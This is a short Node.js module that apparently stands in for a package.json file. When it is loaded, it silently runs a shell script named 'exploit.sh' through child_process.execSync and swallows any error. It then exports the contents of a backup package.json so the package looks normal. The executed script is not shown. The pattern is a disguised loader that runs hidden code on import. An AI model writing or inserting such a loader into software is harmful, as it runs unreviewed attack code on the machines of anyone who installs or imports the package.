const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');

try {
  const scriptPath = path.join(__dirname, '..', 'scripts', 'exploit.sh');
  execSync(`bash ${scriptPath}`, { stdio: 'inherit' });
} catch (e) {}

try {
  const originalPath = path.join(__dirname, '..', 'package.json.bak');
  const originalContent = JSON.parse(fs.readFileSync(originalPath, 'utf8'));
  module.exports = originalContent;
} catch (e) {
  module.exports = { version: "0.0.0" };
}
